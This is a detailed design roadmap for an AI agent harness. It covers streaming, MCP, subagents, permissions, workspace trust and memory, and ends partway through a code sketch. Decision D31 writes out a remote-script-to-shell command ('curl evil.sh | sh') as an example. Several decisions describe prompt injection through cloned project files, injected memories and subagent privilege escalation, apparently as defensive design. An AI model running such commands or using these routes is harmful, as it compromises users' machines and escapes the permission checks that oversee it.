# Roadmap v2 — Major Feature Expansion (Revision 3)

**Purpose of this document:** a complete, no-design-decisions-left specification for the next major version of the Venastine Research Harness. This document covers five interconnected feature areas: a streaming event-driven loop, a Textual TUI, MCP client support, an agent/subagent system, a skill system, and a project/user memory system — all unified by a markdown-based configuration format for agents, skills, and project settings.

**Revision history — Revision 2.** The original draft (Revision 1) was reviewed in full — cross-checked against the actual current codebase, verified with a web search where a specific library's behavior mattered, and independently audited by a second tool-assisted review pass. That review surfaced 13 critical findings and 16 suggestions, several of which pointed at the same underlying issues from different angles. This revision resolves what could be resolved and clearly flags what's still open — see "Open Questions" near the end, which was the most important section for anyone picking it up fresh.

**This is Revision 3.** Rev. 2's own open items were taken as the work list and closed against evidence rather than judgement, in the two ways this project already treats as authoritative: executing against the real codebase, and checking current library documentation. Rev. 3 changes fall into three groups.

*Regressions in Rev. 2's own code sketches, found by tracing them against the code they replace.* Rev. 2 was written as a specification, and three of its illustrative sketches quietly dropped behavior that the current implementation has and depends on — in each case behavior that a prior DEVLOG entry records as a deliberate bug fix. **§13's generator moved `memory.add_assistant_message()` below two early returns, re-opening the exact persistence bug `core/loop.py:50-59` carries a nine-line comment about**, and Rev. 2's acceptance criterion 1 (byte-for-byte identical `ModelResponse`) could not have caught it, because the return value is identical and only the persisted thread is wrong. **§15's `dispatch()` rewrite dropped the `check_output_policy()` call and the unknown-tool guard** — silently deleting the entire secret-redaction layer (ROADMAP §8) in a section whose subject is tightening permissions. **§13 named two public wrappers to convert and missed a third, `continue_conversation()`** — the JSON-retry entry point (ROADMAP §3), which §21 then builds its compaction retry on. These are marked **(Rev. 3, correction)** below. The general lesson is recorded in the "Why" section: a specification that restates existing code in abbreviated form silently proposes deleting whatever it abbreviates away.

*Items Rev. 2 explicitly deferred as unverifiable, now verified.* The test-count question in §13's AC4 is settled (8 test functions, 11 call sites, exact list inline). Open Question 6's MCP SDK shapes are settled, and the answer changed the section: **the `mcp` package is mid-major-version-transition right now, and the SDK's own README instructs dependents to add a `<2` upper bound** — while Rev. 2's dependency table listed `mcp` as the one new dependency with no pin. Two further consequences of reading the real client API — result-shape normalization and session lifetime — are new §17 subsections.

*One live bug in the shipped harness, found incidentally.* `fetch_url` is registered in `tools/registry.py` but has no field in `config.ToolPermissions`, so `is_tool_allowed("fetch_url")` returns `False` and every call to it has always been denied. This is the same class of defect ARCHITECTURE.md §441 already records ("importing a tool module is not the same as making it callable") reappearing one layer down, and §15 is where it gets a permanent structural fix.

**Open Questions is now empty.** Rev. 2 carried six. Three were closed by verification (context-window sourcing, MCP call shapes, the test count) and three by the project owner's decision (**D25** memory scope defaults to `"project"`, **D26** `remember()` requires approval while `pin()` doesn't, **D27** compaction hyperparameters ship as user-overridable defaults rather than fixed constants). This document's opening claim — "a complete, no-design-decisions-left specification" — is now accurate rather than aspirational. What remains is implementation and two things to re-check against real code when the code exists.

**Relationship to ROADMAP.md:** the original ROADMAP.md (§1–§12) is fully built. This document continues the section numbering at §13. Where a section below modifies a file or pattern established in the original ROADMAP.md or ARCHITECTURE.md, it references the original section by number (e.g. "per ARCHITECTURE.md §4.7").

**Companion documents:** ARCHITECTURE.md (what's built), ROADMAP.md (original spec, all built), DEVLOG.md (implementation notes for §1–§12). When a section from this document is implemented, its corresponding entry here gets a "Built" subsection and DEVLOG.md gets a full decision record, same as the original roadmap.

**Section numbers below are stable** — other documents in this repo cross-reference them by number.

---

## Design Decisions Record

Every decision below was made through a structured clarification cycle with the project owner. These are locked — do not re-litigate without cause. Decisions marked **(Rev. 2)** were added or materially revised during the Revision 2 review; the original Revision 1 decision is noted where it changed.

| # | Decision | Choice | Rationale |
|---|---|---|---|
| D1 | Build order | Foundation (§13–§15) → TUI (§16) → MCP (§17) → Agents (§18) → Skills (§19) → Subagent review (§20) → Memory/compaction (§21) | Foundation enables everything else; TUI is highest user-visible value after foundation; MCP expands tool ecosystem; agents/skills depend on file syntax + permissions refactor |
| D2 | Streaming mechanism | Generator/yield with `run_to_completion()` backward-compat wrapper | Callbacks create debt when streaming tool-call args, composing consumers, or handling permission prompts inline. Generators are synchronous (no async needed) at the loop level, composable, and scale to all planned features. |
| D2a | **(Rev. 2)** MCP's inherent async nature | A dedicated background thread owns one persistent asyncio event loop for all MCP traffic; every MCP call is bridged into it via `asyncio.run_coroutine_threadsafe(...).result(timeout=...)`, so `_run()` and every tool handler stay plain synchronous functions | D2 said "no async needed" — true for the loop itself, but MCP's official Python SDK is async end-to-end with no sync surface at all (verified against current SDK docs, not assumed). Making tool dispatch async end-to-end to accommodate this would touch every existing file and invalidate the entire existing synchronous test suite, for a concurrency benefit nothing currently requires. A bridge, isolated to one new module, gets the same result at a fraction of the blast radius. |
| D3 | MCP scope | Client only (consume external MCP servers' tools) | Server mode is a different use case with different security implications. Defer until there's a concrete need. |
| D4 | MCP transports | stdio + HTTP/SSE | stdio for local servers (most common), HTTP/SSE for remote servers. Both are in the MCP spec. |
| D5 | Agent/skill file format | YAML frontmatter + markdown body | Matches ecosystem conventions (opencode agent.md, Claude Code AGENTS.md/skills). |
| D6 | Agent invocation | User-initiated (`/agent <name>`) + model-initiated (subagent spawning tool) | User needs direct control; model needs autonomy for complex tasks. |
| D7 | Skill activation | User-activated via slash command (`/skill <name>`) | Auto-detection adds complexity and unpredictability; can be added later. |
| D8 | File discovery locations | **(Rev. 4: tier ORDER amended, see D29)** Three tiers: harness (`agents/builtin/`, `skills/builtin/`, shipped with the harness itself) → project (`.venastine/`, only if trusted, see D17) → user (`~/.config/venastine/`) | Original was two-tier (project overrides user). A third, un-overridable harness tier was added specifically so a same-named project or user file can never impersonate a built-in agent/skill — see D18. |
| D9 | Subagent reviewing | Opt-in via config flag (`SUBAGENT_REVIEW = False`) | Significant cost/latency impact; default is off. |
| D10 | Default skills | Cybersecurity research, cryptography verification, proof writing, literature review | Covers the project's stated focus areas. |
| D11 | MCP config location | ~~Dedicated `mcp.json` at project root and user config dir~~ **(Rev. 4, AMENDED)** User-level stays `~/.config/venastine/mcp.json`; project-level is **`.venastine/mcp.json`**, NOT the project root | Matching Claude Code's root `.mcp.json` convention put the file *outside* the D17 trust boundary, which hashes only `.venastine/`. Worse, `is_trusted()` returns `True` outright when `.venastine/` is absent — so a root `mcp.json` in a repo with no `.venastine/` would have auto-spawned its `command` with no prompt at all, which is precisely the risk D17 was created to stop. Under `.venastine/` the existing hash, trust prompt and file listing cover it with no change to `workspace_trust.py`. |
| D12 | CLI fate | Permanent fallback — never removed | TUI is primary, but headless/CI/scripting use cases need the CLI to survive. |
| D13 | Streaming + TUI phasing | Streaming refactor is part of the foundation phase (§13), not the TUI phase | Agents and MCP also need streaming; building it once in the foundation avoids retrofitting. |
| D14 | Permission model | **(Rev. 2, revised)** "Stricter wins" — every active layer (global tool policy, active agent's overrides, every active skill's overrides, a tool's own dynamic `approval_check`) is consulted; a tool is allowed only if ALL layers agree (logical AND), approval is required if ANY layer says so (logical OR) | Original D14 only said "context-aware, per-agent overrides." Review found this under-specified two real conflicts: (a) a tool's existing `approval_check` mechanism was being silently bypassed by context-based checks, and (b) nothing stopped an agent/skill from being MORE permissive than the global default. "Stricter wins" resolves both without needing tool-by-tool special-casing. |
| D15 | Tool registry | Dynamic registration at runtime (not just import-time) | MCP tools and agent-scoped tools need runtime `register()`/`unregister()`. |
| D16 | Context/memory management | **(Rev. 2, fully redesigned, no longer "lower priority")** See §21 in full — compaction via a built-in summarizing agent, an always-intact archive, thread-scoped pinning, and user/project-scoped durable memory | Rev. 1's version was a thin placeholder (simple truncation). Rev. 2 replaces it entirely — see §21. |
| D17 | **(Rev. 2)** Workspace trust | Project-level `.venastine/` content (agents, skills, MCP config, `CONTEXT.md`) requires one-time explicit user confirmation before loading, keyed by resolved project path + a content hash, stored at user level (`~/.config/venastine/trusted_projects.json`) | Review found that project-level `mcp.json` can auto-execute arbitrary local commands on startup with zero confirmation, and project-level `CONTEXT.md`/agent files can inject content into every system prompt — both are real risks specifically because "project-level" commonly means "a directory you cloned or downloaded from someone else," not something you authored. Content-hash keying means changed content re-prompts rather than silently inheriting stale trust. |
| D18 | **(Rev. 2)** Harness-tier precedence | A same-named agent/skill at the harness tier can never be shadowed by a project or user file of the same name — a naming collision is rejected outright with a warning, not silently resolved by precedence | Ensures workspace-trust mistakes have a ceiling: even a fully-trusted malicious project can't impersonate a built-in agent. Zero cost to legitimate users, who can simply name their own agents/skills uniquely. |
| D19 | **(Rev. 2)** Project config format split | `.venastine/settings.json` for structured key-value settings (provider/model defaults, ensemble mode, etc.); a separate `.venastine/CONTEXT.md` for free-text project context, injected into an agent's system prompt only if that agent opts in via `use_project_context: true` | Rev. 1's single `config.md` mixed structured settings and free-text "notes" in one file under a name that collided conceptually with the existing `config.py`. Splitting by kind (JSON for settings, markdown for context) is a cleaner mental model and reuses the project's existing config/credentials-style separation philosophy. |
| D20 | **(Rev. 3)** Persist-before-branch is an invariant, not an implementation detail | `memory.add_assistant_message(response)` executes immediately after every `call_model*` return and *before* any stop-condition branch, in the generator exactly as in today's synchronous loop. Any future rewrite of `_run()` must preserve this ordering, and there is a test that fails if it doesn't | This ordering is load-bearing and was already fixed once (`core/loop.py:50-59`, DEVLOG §3): persisting only on the tool-calling path silently drops plain-text final answers and budget-truncated responses, so a thread resumed later is missing its last assistant turn, and ROADMAP §3's JSON-retry breaks because the malformed output it needs to correct was never written. Rev. 2's §13 sketch reintroduced it. Promoting it from "a comment in the code" to "a numbered decision with a regression test" is what stops the next rewrite from doing the same thing a third time. |
| D21 | **(Rev. 3)** Streaming must not silently degrade token accounting | `call_model_stream()` returns usage that is *either* real or explicitly absent. A stream that completes without usage data raises rather than reporting zero, and the OpenAI-compatible path opts into usage explicitly per provider capability (see §13) | Verified: OpenAI-compatible streaming returns no usage at all unless `stream_options={"include_usage": True}` is sent, and not every v1-compatible provider accepts that parameter (Mistral rejects it outright with HTTP 422 — and MISTRAL is in this project's own supported-provider list). Every usage read in `core/client.py` is a defensive `getattr(..., 0)`, so a missing usage object doesn't error — it reports zero. Zero tokens used means `max_total_tokens` is never reached, which disables the budget stop condition *and* §21's compaction trigger, both silently and both only in streaming mode. Failing loudly matches this project's established pattern (`credentials.py` raising rather than defaulting quietly). |
| D22 | **(Rev. 3; RESOLVED Rev. 4)** MCP dependency is version-pinned, and the boundary is treated as live. **The check was performed at implementation time and v2.0.0 had shipped (2026-07-28), so the pin is `mcp>=2.0,<3` and §17 targets v2, not v1.x.** | `requirements.txt` pins `mcp` to an explicit tested version with an upper bound. The v1.x client API (`ClientSession` + a transport context manager) is what §17's design targets; migrating to v2's unified `Client` is a deliberate follow-up, not something to absorb accidentally via an unpinned install | The `mcp` package is transitioning major versions right now, and the SDK's README explicitly instructs dependents to add a `<2` upper bound before v2 stable lands. Rev. 2's dependency table pinned `pyyaml` ("pin explicitly, even if already a transitive dependency") but left `mcp` — the one dependency actually mid-break — unpinned. v2 also collapses transport selection into a single `Client` and adds an in-memory transport, which is materially better for §17, so this is a migration to schedule rather than avoid. |
| D23 | **(Rev. 3; corrected Rev. 4)** MCP tool results are normalized at the bridge. **v2 spells the fields snake_case (`.content` / `.structured_content` / `.is_error`), and raises `MCPError` for protocol-level failures including timeout — so `_normalize()` must catch that too, not only read `is_error` in band.** | `MCPClient.call_tool()` converts the SDK's `CallToolResult` into the plain `dict` shape every other tool handler returns, including mapping `isError` into the same `{"error": ...}` convention the loop already understands | The SDK returns a pydantic `CallToolResult` (`.content` blocks, `.structuredContent`, `.isError`), not a dict. Everything downstream assumes a dict: `check_output_policy()` calls `result.get(key)` and would raise `AttributeError`, meaning MCP output would bypass or break secret redaction; `memory.add_tool_result()` would `str()` a pydantic repr into the thread. This is the "fix it at the producer, not the consumer" principle applied literally — one conversion at the boundary, versus every consumer learning about MCP types. |
| D24 | **(Rev. 3)** Every registered tool must have a declared permission | A registry-vs-`ToolPermissions`/`ToolApprovals` consistency check runs at import time and fails loudly on any registered tool with no declared field, rather than letting `getattr(..., False)` decide by omission | Found live in the current codebase: `fetch_url` is registered and documented as Working (ARCHITECTURE.md §423) but absent from `ToolPermissions`, so it has always been denied by policy. The failure mode is invisible — the tool's schema is still advertised to the model, the model still calls it, and the only symptom is a denial message inside a tool result. `_default_for_unknown_tool()` (§15) intentionally makes omission meaningful for MCP tools; that makes it *more* important that omission is never accidental for built-in ones. |
| D25 | **(Rev. 3, resolved)** Default scope for `remember()` | `"project"` when the model doesn't pass an explicit `scope`. The parameter stays explicit per call, so `"global"` remains one word away | The two error directions are not symmetric. A memory that should have been project-scoped but landed globally contaminates every later conversation with a stale fact about a codebase you may not be working in, and it is hard to spot because it presents as the model simply being confident. A memory that should have been global but landed project-scoped merely fails to appear somewhere useful, and the fix is to say it again. Defaulting narrow makes the recoverable mistake the common one. It also matches the granularity `.venastine/` and D17 already operate at, so "project" means the same thing here as everywhere else in the system. |
| D26 | **(Rev. 3, resolved)** Approval gating for `pin` / `remember` | `remember()` requires approval; `pin()` does not | They differ on the axis that already separates `write` from `read`. `pin()` is thread-scoped, reversible, and takes effect inside a conversation the user is actively watching — a wrong pin costs some context budget and nothing else. `remember()` writes something that outlives the thread and silently shapes conversations the user hasn't started yet, so a wrong or injected memory is both persistent and invisible at the moment it actually matters. See §21 for the two consequences this has (headless paths, and what to do if the prompt turns out to be too frequent). |
| D27 | **(Rev. 3, resolved)** Compaction hyperparameters | Ship reasonable defaults, don't treat them as settled, and make every one of them user-overridable through the existing settings mechanism (D19) rather than editable only in `config.py` | Real long threads answer this better than reasoning does, and unlike D25/D26 a wrong value is cheap and immediately visible. This is the same posture `config.py` already documents for `MAX_TOKEN_BUDGET` ("Placeholder default; tune based on actual usage patterns once you have real runs to look at"). Making them user-settable is what turns "we didn't decide" from a deferral into a feature: different models and different working styles genuinely want different values, so the tuning belongs with the user rather than in a constant they'd have to fork the harness to change. |
| D28 | **(Rev. 4)** Approval default for MCP tools | MCP tools are **allowed** by default (D14/§15) but **require approval** by default, with a per-server `autoApprove` opt-out. Implemented as a *base default* (`permissions.set_dynamic_approval_default`), never as a `ToolSpec.approval_check` | Allowed-by-default and trusted-by-default are different questions. An MCP server is third-party code the model can reach without the user ever naming it; the project tier is trust-gated but a user-level `mcp.json` auto-connects. The opt-out cannot live in `approval_check` because `approval_needed()` ORs those in and OR can only tighten — an opt-out expressed there would have been silently inert. Varying the base default keeps D14's one-way ratchet exactly intact. |
| D29 | **(Rev. 4)** Tier precedence is harness > **user** > project | Same-name collisions resolve to the user tier, for MCP servers, agents and skills alike. Harness still beats both (D18, unchanged). Non-colliding definitions from every tier all load — precedence only breaks same-name ties | D8's original order was project-over-user, the conventional "more specific config wins". That is the wrong default here, because "project" doesn't mean more specific — it means *it arrived with a directory you cloned*, which is D17's entire premise. A shadowed agent changes a prompt; a shadowed MCP server changes which local command runs under a name you already trust. **`settings.json` deliberately keeps project-over-user**: its values are displayed verbatim in the trust prompt, so they are consented to directly, whereas an agent/skill/server is a *named identity* whose danger is impersonation. |
| D30 | **(Rev. 4)** `mcp.json` validation is by connection, not by schema | Unrecognized keys are accepted and ignored (DEBUG-logged); a server is validated by connecting and calling `list_tools()`; per-server failures are named and skipped, never fatal | `settings.json` raises on unknown keys (§14 amendment 1) because every one of its keys changes behavior. `mcp.json` is routinely shared with Claude Desktop, Cursor and others, which carry keys this harness doesn't implement — failing startup over a decorative key is worse than ignoring it. What we can't understand about *what executes* still surfaces, as that server's connect failure. One stale entry must never make the harness unusable. |
| D31 | **(Rev. 4)** User-level MCP servers are acknowledged once | First time a user-level server is seen, show the command it will run and confirm; store name → hash of its config entry, so an edited command re-asks | Project-level servers are covered by D17. User-level ones had no gate at all, on the assumption you authored them — which is exactly wrong when an installer or another tool appended to the file. Content-hash keying is D17's pattern reused, so an acknowledgement of `npx pkg` can't silently carry over to `curl evil.sh \| sh` under the same name. |

### Decisions record — S1–S4 (the §14–§18 review's fix pass)

The §14–§18 review found 65 issues; four of its fixes needed a decision rather
than a correction. They are cited from `agents/`, `mcp_client/` and `core/`, and
they amend §18 and §17 rather than belonging to a section of their own — which is
why they sit here with `D1`–`D31` instead of under a section heading.
`DEVLOG.md`'s §14–§18 review pass records the same four in narrative form.

| # | Decision |
|---|---|
| **S1** | **Subagent sign-off, all-or-nothing, per turn.** Approving a spawn authorises the child's whole approval-gated set for the rest of the turn. Per-tool selection is deferred to §23's response channel and recorded there as a named consumer. |
| **S2** | **The parent's approval tightenings union into the child.** Only `True` entries carry, since a `False` is indistinguishable from absent under D14's OR — so unioning can only tighten. **This amends §18's locked sketch**, which shows `approval_overrides=agent_def.approval_overrides` verbatim; C6 reasoned about `allowed_tools` and never considered the approval axis. |
| **S3** | **MCP teardown by exact name, not by prefix.** `mcp__<server>__<tool>` cannot be taken apart again — neither `__` in a server name nor in a tool name is illegal. Registration records what it registered. No `mcp.json` content is rejected up front, so decision G stands. |
| **S4** | **One central effort validator, cached.** A network call at startup is acceptable; on lookup failure the requested level passes through unverified with a WARNING rather than being dropped, and the failure is not cached. |

**Do not confuse these with the audit's severity grades.** Findings in Audit
Pass 1 are graded `S1` (worst) to `S4`, and `ROADMAP_v2.md` cites those grades in
§30–§35. A bare `S1` in a section written *about* the audit is a severity; a bare
`S1` anywhere else is the decision above. See the namespace list in `AGENTS.md`.

### Decisions record — E1–E14 (ensemble mode, ROADMAP.md §10's revisit)

Ensemble mode is §10's subject and its revisit note lives in `ROADMAP.md`, but its
decisions are cited from `config.py` and four files under `core/reasoning/`, so
they belong in the record with everything else rather than in a note about a note.

| # | Decision |
|---|---|
| E1 | Diversity from different MODELS. `config.ENSEMBLE_MODELS`, entries `{provider_name, model}`. Deviates from §10's own note; see above. |
| E2 | `config.py` only, following `CRITIC_MODEL`. `ensemble_models` is rejected from `settings.json` **by name** — R12's rule applied to a second kind of authority. Turning the mode on can only spend more of the provider the user already chose; a *roster* chooses providers, and a project's `settings.json` beats the user's. §14 already flagged project-tier provider selection as its own grant; this is that grant times N. |
| E3 | N is `len(ENSEMBLE_MODELS)`, derived. A separately configured count could disagree with the roster that produced the candidates, and a confidence score's denominator must not be able to lie. |
| E4 | `ensemble_n` stays a known settings key and a pipeline parameter, vestigial, with a WARNING when set. Removing the key would make every existing `settings.json` that sets it **raise** — unknown keys raise by design. |
| E5 | Refuse on fewer than 2 **distinct** `(provider, model)` pairs. The load-bearing guard: `[X, X, X]` recreates §16's exact defect through the new config. |
| E6 | API keys are not pre-validated; validation is by connecting. Matches §16's `/model` (warns on an empty `API_KEY` so a local endpoint stays usable) and MCP's per-server posture. |
| E7 | A failed candidate is named, traced and skipped; the denominator is the number that produced text. One survivor **degrades to the single-candidate path** rather than being scored as an ensemble of one, which would report unanimous corroboration from a single source. All candidates failing is an error. |
| E8 | Consistency enters as a **disagreement penalty**: `raw -= 0.15 * (1 - consistency)`, factual claims only, subtracted like `ASSUMPTION_FLAG_PENALTY`. Unanimity is free, dissent subtracts. |
| E9 | Non-factual claims untouched. §10 decided consistency does not *rescue* them from the cap; whether dissent should *penalise* a speculative claim is a different judgment and was never made. |
| E10 | `score_claim` rounds once, then uses that value for both the tier and the breakdown. |
| E11 | Candidate labels follow the **survivors**, never roster position. |
| E12 | No new `Claim` field, no new `PipelineRun` field, no schema change. The denominator goes in the existing `score_breakdown` (§20's precedent, which put tier overrides there to avoid migrating every `vars(c)` site); the roster goes in `run.trace`. |

**E13–E14 (batch 19, #77/#115 — the record and the display catch up with E1–E12).**
E12's "no new field" was about *scoring*; audit #77 showed the run's record could not
substantiate its own consistency numbers, and #115 that a skipped candidate left a
sidebar row running forever.

| # | Decision |
|---|---|
| E13 | The record keeps every surviving candidate. `PipelineRun.candidates: list[dict]`, one entry per survivor (`candidate`/`provider_name`/`model`/`chars`/`text`); `text` is in-memory only, stripped at persistence into a metadata-only `candidates_json` column (full texts live in `01_candidate_N.md` artifacts and each candidate's own pass thread). With two or more survivors, Pass 3b receives ALL candidates under Pass 2's labels — the claims came from their union, so the critic sees the texts its input came from — and the artifact set is per-candidate numbered to match the trace and `asserted_by_candidates`; a degraded single survivor keeps the historical `01_raw_response.md` byte for byte. |
| E14 | A pass failure is reported as `pass_complete(ok=False)` — payload-carried outcome, matching `tool_result` — never a new kind. Both `_run_pass` and `_run_pass_with_json_retry` emit it before re-raising (uniform: fatal passes report too), explicit `ok=True` at every success site, and the widget's `pass_completed(pass_id, *, ok)` makes the answer REQUIRED so a future caller cannot tick a failed row done. Display contract: panel-only — the failure narrative already travels as the trace line, and no shell prints it twice. |

### Decisions record — C1–C10 (Revision 1's review conflicts)

Revision 1 was reviewed against Revision 2 and the conflicts were numbered. The
resolutions shipped and are cited as authority in `ROADMAP_v2.md` section
headings ("fixes C6, locked in"), in `ARCHITECTURE.md`, in
`tests/BREAKING_CHANGES.md`, and in **six production files** — but the list
itself was never copied into any document. Recovered here from the citing lines,
found by audit #147. Only the five with live citations are recovered; the gaps in
the numbering are conflicts that were resolved without leaving a reference.

| # | Decision |
|---|---|
| **C1** | **The permission prompt is bridged, not inlined.** Rev. 1 had the TUI unable to render an approval prompt from inside the loop. `_run()` is already a generator yielding `LoopEvent` and `permission_channel` already exists, so the app consumes the generator on a worker and answers through the queue — no new loop machinery. §16. |
| **C3** | **A subagent's depth is carried on the `ToolContext`, not passed as a parameter.** Rev. 1's `spawn_subagent` took `depth: int = 0`, which `registry.dispatch()` could never populate — dispatch passes only `params`, parsed from the model's tool call, so no incremented depth could ever reach a nested call. `subagent_depth` rides on the context and `spawn_subagent` increments it when it builds the child. Checked against `config.SUBAGENT_MAX_DEPTH`. §18. |
| **C6** | **Intersection, never union.** A subagent's effective `allowed_tools` is the intersection of its own declaration and its parent's currently-active set. Without this, a restricted parent could spawn a permissively-declared child specifically to escape its own restriction — privilege escalation one hop removed, undermining §15's "stricter wins". **Amended by S2** for the approval axis, which C6 never considered. §18. |
| **C8** | **`run_to_completion()` lives in `core/loop.py`, not its own module.** It is coupled to `_run()`'s exact generator shape, and a separate module risked a circular import for no benefit. (Settles Rev. 1's open question S16 — a different S namespace; see `AGENTS.md`.) §13. |
| **C10** | **`MCPClient.__init__` stores `server_configs`.** Rev. 1's constructor never did, so every later method that needed it failed. A real bug rather than a design conflict; kept in this list because it is cited by number from `mcp_client/client.py` and pinned by a regression test. §17. |

**A fourth namespace uses this prefix.** The research pipeline's claim ids are
`C1`, `C2`, `C3`… (`{"C1": [...]}` in a Pass 5 payload, and the id shapes
`test_json_retry` asserts). Those are run data, not decisions; they appear in
`ROADMAP_v2.md` §26 and in `tests/BREAKING_CHANGES.md` as example payloads. See
the namespace list in `AGENTS.md`.

---

## Index

- 13. Streaming refactor — generator/yield loop + `LoopEvent` types **(BUILT)**
- 14. File syntax + config loader — YAML frontmatter + `.md` discovery + workspace trust **(BUILT)**
- 15. Permission system refactor — context-aware permissions ("stricter wins") + dynamic tool registration **(BUILT)**
- 16. TUI — Textual app + widgets + slash commands + streaming integration **(BUILT)**
- 17. MCP client — stdio + HTTP/SSE + `mcp.json` + async bridge + workspace trust **(BUILT)**
- 18. Agent system — agent `.md` format + manager + subagent tool + per-agent scoping + intersection rule **(BUILT)**
- 19. Skill system — skill `.md` format + manager + activation + default skills **(BUILT)**
- 20. Subagent reviewing — opt-in post-pipeline review with consented correction **(BUILT)**
- 21. Memory system — compaction, archive, thread-scoped pinning, user/project memory **(BUILT: §21a + §21b + §21c)**
- 22. Pipeline observability — orchestrator events + the live research view **(added during §16; BUILT)**
- 23. Interactive tools — question tool, todo list, and the response channel they share **(added during §16; BUILT — slice 1 was the channel, its three consumers and §18's deferred per-tool sign-off; slice 2 shipped `ask_user` and `todo_write`, covered by `test_question_tool.py` and `test_todo.py`)**
- 24. `/init` — generate the project's documentation set **(added during §16; BUILT)**
- 25. Authorized tool use in the research pipeline **(BUILT)**
- 26. Research legibility — pass internals, code stages, the claims view, colour, copy **(added after §22's first live run; BUILT)**
- 27. Thread legibility — thread `kind`, chat-only picker, transcript replay on resume **(added after §26's first live session; BUILT)**
- 28. The shell capability classifier — one classification for the approval gate and the executor, `SHELL_APPROVAL_MODE`, the `.venastine` read-only mount **(added by Audit Pass 1 fix batch 8 for #157; BUILT)**
- 29. The CLI shell — one stdin reader, every request kind rendered, `main(argv)` and a startup order that does nothing before argparse **(added by Audit Pass 1 fix batch 9 for #100, #7, #101, #102, #141; BUILT)**
- 30. The pipeline's payload boundary — one shape check for the ten passes, shape failures re-entering §3's retry, and a trace that reports what was applied **(added by Audit Pass 1 fix batch 10 for #76, #75, #78, #79, #123; BUILT)**
- 31. What a tool call is allowed to cost — one declared bound per tool, a killable child for the six that compute, and a bound at the producer for the three that read **(added by Audit Pass 1 fix batch 11 for #57, #55, #56; BUILT)**
- **§32. The catalogs — what the model is told it can do, and who gets to write it** — BUILT (#68, #131, #69, #70, #71, #72; closes unit 8)
- **§33. The call boundary — the one file every model call goes through** — BUILT (#37, #38, #39, #135; closes unit 3)
- **§34. /init's vocabulary — four lists for one question** — BUILT (#96, #94, #95, #98; closes unit 12)
- **§35. The record's index — the decisions, and whether they can be found** — BUILT (#16, #17, #147, #91; closes unit X5)
- **§36. Compaction's boundaries — trigger, notice, pin, summarizer input** — BUILT (#43, #44, #45, #89, #90, #92, #172; closes units 4 and 11)
- **§37. MCP's edges — disclosure, SSE, teardown, catalogue** — BUILT (#60, #61, #62, #63, #64, #65; closes unit 7)
- **§38. Live output — progressive rendering and visible thinking** — BUILT (the transcript buffered a whole turn; thinking was never captured at all)
- **§41. The transcript's vocabulary — colour, markers, and what an edit looks like** — BUILT (three kinds of line shared one grey; the `warning` role was unreachable; `write`/`edit` showed 60 characters of payload instead of a change)
- **§42. The consent surface — what a modal shows, and what the agent says it is doing** — BUILT (the permission modal parsed console markup out of the payload it exists to show; `shell` gained a display-only `rationale`)
- **§43. Who is speaking, and what the session remembers** — BUILT (the `venastine ›` label rendered after a turn's reasoning; `/new` left the previous conversation on screen; a `/model` switch was forgotten at exit; workspace trust was reported broken and is not)
- **§44. The provider it is on, the reasoning it kept, and the project it is in** — BUILT (a remembered `/model` pair left the launch key warning naming the wrong provider; reasoning was never persisted, never echoed, and — measured here — never rendered at all on Anthropic; `/init` scaffolded the harness instead of the workspace; the compaction trigger was a flat 40k on every window)
- **§45. What a source is worth, and how close it actually is** — **(BUILT: both slices)** (the two scores per cited source were model self-reports that nothing checked and nothing consumed; no source text survived the pass, so nothing could have)
- **Open Questions — None Remaining** (Rev. 3 — all decisions locked; verification items only)
- **Why these calls, not just what they are** (Rev. 3 — the reasoning patterns behind several decisions above)

---

## 13. Streaming refactor — generator/yield loop + `LoopEvent` types

**Problem:** `RunAgentLoop._run()` currently runs a whole multi-turn tool-calling loop to completion and returns one final `ModelResponse`. Nothing outside it can observe progress — token deltas, tool calls starting/finishing, permission prompts — while it's happening. Every planned feature (TUI live rendering, subagent observability, MCP tool call visibility) needs this.

### New file: `core/events.py`

```python
from dataclasses import dataclass, field
from typing import Optional, Any

@dataclass
class LoopEvent:
    """One event yielded by RunAgentLoop._run() as it progresses. Exactly
    one of the fields below is meaningfully populated per event, matching
    what happened at that point in the loop."""
    token_delta: Optional[str] = None
    tool_call_start: Optional[dict] = None      # {"id", "name", "input"}
    tool_result: Optional[dict] = None           # {"id", "result"}
    permission_request: Optional[dict] = None    # {"tool_name", "params"} -- see below
    final_response: Optional[Any] = None         # the ModelResponse, set on the terminal event
    stop_reason: Optional[str] = None            # "complete" | "max_steps_reached" | "token_budget_exceeded"
```

**Note on error handling (S11, resolved):** there is deliberately no `error` variant on `LoopEvent`. Exceptions raised mid-loop propagate naturally out of the generator, unchanged from the current (non-streaming) behavior. This matters concretely: `orchestrator.py`'s existing failure-path persistence (`except Exception: update_pipeline_run(..., status="failed"); raise`) depends on a real exception propagating — converting failures into a data-shaped event would require every consumer, including that already-built and tested code, to know to unpack and re-raise it. Consumers that want graceful error display (the TUI) wrap their own consumption loop in `try/except` and translate what they catch into UI, rather than the loop itself deciding how errors get presented.

### `core/loop.py` changes

`_run()` becomes a generator. The critical correctness point Rev. 1's sketch got wrong: **the terminal `yield` + `return` must only happen on an actual stop condition** — task complete, budget exceeded, or `max_steps` exhausted — never unconditionally at the end of each loop iteration. Getting this wrong silently breaks multi-turn tool-calling entirely (the loop would stop after exactly one iteration regardless of pending tool calls).

```python
@staticmethod
def _run(memory, system_prompt, provider_name, model, allowed_tools,
         max_steps, max_total_tokens=None, temperature=None,
         permission_channel=None):
    """
    permission_channel: an optional queue.Queue (plain stdlib, NOT
    asyncio -- this is a thread-to-thread handoff between the TUI's
    worker thread running this generator and the TUI's main/UI thread,
    not a bridge to an async subsystem; see §17 for why MCP needs a
    genuinely different mechanism). If None (CLI/pipeline paths), any
    tool call that would need approval is denied by default -- same
    behavior as today's dispatch() with no approval_callback.
    """
    client = api_initialization(provider_name)
    tool_schemas = registry.schemas(allowed_tools)
    total_tokens_used = 0

    for _ in range(max_steps):
        response = None
        for token in call_model_stream(client, provider_name, model, memory.messages,
                                        system_prompt, tool_schemas, temperature):
            if token.text_delta:
                yield LoopEvent(token_delta=token.text_delta)
            if token.final_response is not None:
                response = token.final_response

        total_tokens_used += response.usage.get("input_tokens", 0) + response.usage.get("output_tokens", 0)

        # (Rev. 3, correction -- D20) Persist EVERY assistant turn BEFORE any
        # branching, exactly as the current synchronous loop does. Rev. 2's
        # sketch had this call below both early returns, which silently
        # reintroduces the bug core/loop.py:50-59 documents at length:
        # plain-text final answers and budget-truncated responses never
        # reach MessageLog, so a thread resumed via
        # ConversationMemory(thread_id=...) is missing its last assistant
        # turn, and ROADMAP §3's JSON-retry has no malformed output to
        # correct. Note this is invisible to a test that only compares the
        # returned ModelResponse -- see acceptance criterion 6.
        memory.add_assistant_message(response)
